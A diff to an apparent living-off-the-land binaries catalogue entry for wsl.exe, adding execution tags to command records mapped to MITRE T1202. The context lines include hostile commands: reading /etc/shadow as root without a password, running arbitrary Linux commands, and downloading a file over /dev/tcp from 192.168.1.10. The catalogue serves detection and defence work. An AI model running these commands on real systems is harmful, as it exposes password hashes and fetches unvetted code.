@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10, Windows Server 2019, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: wsl.exe -u root -e cat /etc/shadow
     Description: Cats /etc/shadow file as root
     Usecase: Performs execution of arbitrary Linux commands as root without need for password.
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10, Windows Server 2019, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: wsl.exe --exec bash -c "<command>"
     Description: Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)
     Usecase: Performs execution of arbitrary Linux commands.
@@ -25,6 +29,8 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 10, Windows Server 2019, Windows 11
+    Tags:
+      - Execute: CMD
   - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
     Description: Downloads file from 192.168.1.10
     Usecase: Download file
